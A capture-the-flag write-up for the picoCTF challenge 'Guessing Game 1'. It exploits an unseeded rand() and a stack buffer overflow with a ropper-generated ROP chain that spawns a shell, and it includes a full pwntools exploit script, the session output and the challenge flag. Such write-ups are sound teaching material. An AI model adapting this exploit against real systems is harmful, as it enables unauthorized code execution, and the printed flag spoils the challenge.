# Guessing Game 1
Category: Binary Exploitation

## Description

> I made a simple game to show off my programming skills. See if you can beat it!

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100


long increment(long in) {
	return in + 1;
}

long get_random() {
	return rand() % BUFSIZE;
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n\n");
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```

Makefile:
```makefile
all:
	gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c

clean:
	rm vuln
```

In addition, a binary file was included.

## Solution

This is a short program which randomly selects a number, and asks the user to guess it. If successful, the user can enter a name and be congratulated.

Actually, did I say "*randomly selects*"? That's a bit of an overstatement. The program uses `rand()` without even setting a seed via `srand`, making it pretty easy to "guess".

Let's take an example program which calls `rand()` and see what it outputs if we call the program a few times:

```c
#include <stdio.h>
#include <stdlib.h>

int main ()
{
  printf ("rand() returned: %d\n", rand());
  return 0;
}
```

Output:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_1# gcc rand.c -o rand
root@kali:/media/sf_CTFs/pico/Guessing_Game_1# ./rand
rand() returned: 1804289383
root@kali:/media/sf_CTFs/pico/Guessing_Game_1# ./rand
rand() returned: 1804289383
root@kali:/media/sf_CTFs/pico/Guessing_Game_1# ./rand
rand() returned: 1804289383
```

So we can see that the first number returned by `rand()` is far from being truly random. Notice that we're running the program from scratch a few times in a row. Calling `rand()` a second time *within* the same program will produce a different (yet still predictable) "random" number, and so will the third time and so on.

Now, the real question here is if the `rand()` implementation on the server is the same as our local `rand()` implementation, i.e. will it select the same random number at the beginning of the sequence. The specs don't really define what are the values that `rand()` should return, just that it should return "a pseudo-random integral number in the range between 0 and RAND_MAX". So, we just have to try for ourselves and see.

If the implementation is the same, the number chosen by the program would be:
```c
	long ans = get_random(); // This will return 1804289383 % 100 = 83
	ans = increment(ans); // 'ans' will be 83 + 1 = 84
```

Let's try it:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_1# nc jupiter.challenges.picoctf.org 28951
Welcome to my guessing game!

What number would you like to guess?
84
Congrats! You win! Your prize is this print statement!

New winner!
Name?
```

Looks good! But even if it wouldn't have worked, we could have easily brute-forced the guess, since the random number is limited to 100 values. So, bypassing the guess isn't that hard anyway.

In order to read the `rand` values directly from a Python script, we can implement the following module:
```python
#
# c_rand
#

from ctypes import *
import collections

# This module caches results from LibC rand().
# After creating a new generator (e.g. r = rand_gen()), each call to next(r) will 
# return the same sequence as libc.rand() returned from the start.
# For example:
#
# >>> r1 = rand_gen()
# >>> r2 = rand_gen()
# >>> assert(next(r1) == next(r2))
# 
# Generator factory based on https://stackoverflow.com/questions/55674212/shared-python-generator
_libc = CDLL("libc.so.6")
_deques = []
_already_gone = []

def rand_gen():
    new_deque = collections.deque()
    new_deque.extend(_already_gone)
    _deques.append(new_deque)

    def gen(mydeque):
        while True:
            if not mydeque:             # when the local deque is empty
                newval = _libc.rand()       # fetch a new value and
                _already_gone.append(newval)
                for d in _deques:        # load it to all the _deques
                    d.append(newval)
            yield mydeque.popleft()

    return gen(new_deque)
```

Basically, this module implements a generator factory where each generator allows reading C's `rand()` sequence from the start. Alternatively, we could have just used a hardcoded "84".

Now, let's continue towards the binary exploitation part. It's pretty obvious that we have a buffer overflow here:
```c
#define BUFSIZE 100

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}
```

`winner` is 100 bytes long, but it's possible to read up to 360 bytes into it. This means that we can override the return address of the function and take control of the flow.

`checksec.sh` claims that the binary has a stack canary, but we can see in the assembly that this is not correct (at least not for `win`):
```assembly
[0x00400c40]> s sym.win
[0x00400c40]> pdf
/ (fcn) sym.win 76
|   sym.win ();
|           ; var char *s @ rbp-0x70
|           ; CALL XREF from main @ 0x400cfc
|           0x00400c40      55             push rbp
|           0x00400c41      4889e5         mov rbp, rsp
|           0x00400c44      4883ec70       sub rsp, 0x70
|           0x00400c48      488d3d782409.  lea rdi, str.New_winner___Name ; 0x4930c7 ; "New winner!\nName? "
|           0x00400c4f      b800000000     mov eax, 0
|           0x00400c54      e8b7f30000     call sym.__printf
|           0x00400c59      488b15489b2b.  mov rdx, qword [obj.stdin]  ; obj._IO_stdin
|                                                                      ; [0x6ba7a8:8]=0x6ba580 obj._IO_2_1_stdin ; FILE *stream
|           0x00400c60      488d4590       lea rax, [s]
|           0x00400c64      be68010000     mov esi, 0x168              ; 360 ; int size
|           0x00400c69      4889c7         mov rdi, rax                ; char *s
|           0x00400c6c      e89ffd0000     call sym.fgets              ; char *fgets(char *s, int size, FILE *stream)
|           0x00400c71      488d4590       lea rax, [s]
|           0x00400c75      4889c6         mov rsi, rax
|           0x00400c78      488d3d5b2409.  lea rdi, str.Congrats__s    ; 0x4930da ; "Congrats %s\n\n"
|           0x00400c7f      b800000000     mov eax, 0
|           0x00400c84      e887f30000     call sym.__printf
|           0x00400c89      90             nop
|           0x00400c8a      c9             leave
\           0x00400c8b      c3             ret
[0x00400c40]>   
```

Our binary is statically linked:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_1# ldd ./vuln
        not a dynamic executable
```

This means that we have many gadgets that can be used in order to create a ROP chain.

Therefore, our plan is to:
1. Generate a ROP chain
2. Find the exact overflow offset
3. Override the stack at the overflow offset with the ROP chain and spawn a shell

We can generate a ROP chain using a tool, we just need to make sure that:
 * The padding and the ROP chain both fit into 360 bytes.
 * The ROP chain does not contain any byte with the value '`0x0a`' (a.k.a '`\n`') since `fgets` will stop reading when it encounters a newline.

ROPgadget ("`ROPgadget --binary ./vuln --ropchain --badbytes 0a`") produces a ROP chain which is too long, but `ropper` gets it right:

```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_1# source /hdd2/py3venv/ropper/bin/activate
(ropper) root@kali:/media/sf_CTFs/pico/Guessing_Game_1# ropper --file ./vuln  --chain "execve cmd=/bin/sh" --badbytes 0a
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] filtering badbytes... 100%
[LOAD] removing double gadgets... 100%

[INFO] ROPchain Generator for syscall execve:


[INFO]
write command into data section
rax 0xb
rdi address to cmd
rsi address to null
rdx address to null


[INFO] Try to create chain which fills registers without delete content of previous filled registers
[*] Try permuation 1 / 24
[INFO]

[INFO] Look for syscall gadget

[INFO] syscall gadget found
[INFO] generating rop chain
#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # f01c7ecf217d3cebdf4f676920f17ebfcb33d5d14d78df8dfffed5c5290e6f62
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret;
rop += '//bin/sh'
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
rop += rebase_0(0x00000000002ba0e0)
rop += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
rop += rebase_0(0x00000000002ba0e8)
rop += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
rop += rebase_0(0x00000000002ba0e0)
rop += rebase_0(0x0000000000010ca3) # 0x0000000000410ca3: pop rsi; ret;
rop += rebase_0(0x00000000002ba0e8)
rop += rebase_0(0x000000000004cc26) # 0x000000000044cc26: pop rdx; ret;
rop += rebase_0(0x00000000002ba0e8)
rop += rebase_0(0x00000000000163f4) # 0x00000000004163f4: pop rax; ret;
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000049e35) # 0x0000000000449e35: syscall; ret;
print rop
[INFO] rop chain generated!
(ropper) root@kali:/media/sf_CTFs/pico/Guessing_Game_1# deactivate
```

We can incorporate this ROP chain into the following `pwntools` script:
```python
# First, generate a template via:
# $ pwn template --host jupiter.challenges.picoctf.org --port 28951 ./vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


from struct import pack
import c_rand

class GuessingGame1():
    def __init__(self, io):
        self.io = io
        self.rand = c_rand.rand_gen()

    def guess(self, guess_val):
        self.io.recvuntil("What number would you like to guess?\n")
        log.debug("Guessing: '{}'".format(guess_val))
        self.io.sendline(guess_val)
        line = self.io.recvline()
        if not "Congrats!" in line.decode("ascii"):
            raise RuntimeError("Incorrect guess: {}".format(guess_val))

    def enter_name(self, name):
        log.debug("Entering name: '{}'".format(name))
        self.io.sendline(name)

    def send_payload(self, payload):
        guess_val = str((next(self.rand) % 100) + 1)
        log.info("Guessing: '{}'".format(guess_val))
        self.guess(guess_val)
        log.info("Sending payload: \n{}".format(hexdump(payload)))
        self.enter_name(payload)
        self.io.recvline()
        self.io.recvline()
        self.io.recvline()

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(150, n = exe.bytes)
    gg1 = GuessingGame1(proc)
    with context.local(log_level='ERROR'): 
        gg1.send_payload(payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset

def get_rop():
    p = lambda x : pack('Q', x)

    IMAGE_BASE_0 = 0x0000000000400000 # f01c7ecf217d3cebdf4f676920f17ebfcb33d5d14d78df8dfffed5c5290e6f62
    rebase_0 = lambda x : p(x + IMAGE_BASE_0)

    rop = b''

    rop += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret;
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
    rop += rebase_0(0x00000000002ba0e0)
    rop += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret;
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
    rop += rebase_0(0x00000000002ba0e8)
    rop += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
    rop += rebase_0(0x00000000002ba0e0)
    rop += rebase_0(0x0000000000010ca3) # 0x0000000000410ca3: pop rsi; ret;
    rop += rebase_0(0x00000000002ba0e8)
    rop += rebase_0(0x000000000004cc26) # 0x000000000044cc26: pop rdx; ret;
    rop += rebase_0(0x00000000002ba0e8)
    rop += rebase_0(0x00000000000163f4) # 0x00000000004163f4: pop rax; ret;
    rop += p(0x000000000000003b)
    rop += rebase_0(0x0000000000049e35) # 0x0000000000449e35: syscall; ret;

    return rop

io = start()

io.recvuntil("Welcome to my guessing game!")

overflow_offset = get_overflow_offset()

payload = fit({overflow_offset: get_rop()})
assert(len(payload) <= 360)

gg1 = GuessingGame1(io)
gg1.send_payload(payload)
io.interactive()
```

The script uses the `c_rand` module to get the `rand()` value and guess correctly the missing number, then uses the `cyclic` pattern to find the overflow offset in `get_overflow_offset`, and finally overwrites the stack at the overflow offset with the ROP chain generated by `ropper`.

Output:

```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_1# python3 exploit.py
[*] '/media/sf_CTFs/pico/Guessing_Game_1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to jupiter.challenges.picoctf.org on port 28951: Done
[+] Starting local process '/media/sf_CTFs/pico/Guessing_Game_1/vuln': pid 15083
[*] Process '/media/sf_CTFs/pico/Guessing_Game_1/vuln' stopped with exit code -11 (SIGSEGV) (pid 15083)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/Guessing_Game_1/core.15083'
    Arch:      amd64-64-little
    RIP:       0x400c8b
    RSP:       0x7ffdcc0bc5a8
    Exe:       '/media/sf_CTFs/pico/Guessing_Game_1/vuln' (0x400000)
    Fault:     0x6161616161616170
[*] Overflow offset: 120
[*] Guessing: '84'
[*] Sending payload:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  eb db 40 00  00 00 00 00  │daab│eaab│··@·│····│
    00000080  2f 2f 62 69  6e 2f 73 68  96 06 40 00  00 00 00 00  │//bi│n/sh│··@·│····│
    00000090  e0 a0 6b 00  00 00 00 00  c9 95 46 00  00 00 00 00  │··k·│····│··F·│····│
    000000a0  ef be ad de  ef be ad de  ef be ad de  ef be ad de  │····│····│····│····│
    *
    000000c0  eb db 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
    000000d0  96 06 40 00  00 00 00 00  e8 a0 6b 00  00 00 00 00  │··@·│····│··k·│····│
    000000e0  c9 95 46 00  00 00 00 00  ef be ad de  ef be ad de  │··F·│····│····│····│
    000000f0  ef be ad de  ef be ad de  ef be ad de  ef be ad de  │····│····│····│····│
    00000100  ef be ad de  ef be ad de  96 06 40 00  00 00 00 00  │····│····│··@·│····│
    00000110  e0 a0 6b 00  00 00 00 00  a3 0c 41 00  00 00 00 00  │··k·│····│··A·│····│
    00000120  e8 a0 6b 00  00 00 00 00  26 cc 44 00  00 00 00 00  │··k·│····│&·D·│····│
    00000130  e8 a0 6b 00  00 00 00 00  f4 63 41 00  00 00 00 00  │··k·│····│·cA·│····│
    00000140  3b 00 00 00  00 00 00 00  35 9e 44 00  00 00 00 00  │;···│····│5·D·│····│
    00000150
[*] Switching to interactive mode

$ ls
flag.txt
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b30e66e722f3f0d0}
$ exit
$
[*] Got EOF while reading in interactive
$
[*] Closed connection to jupiter.challenges.picoctf.org port 28951
[*] Got EOF while sending in interactive
```

The flag: `picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b30e66e722f3f0d0}`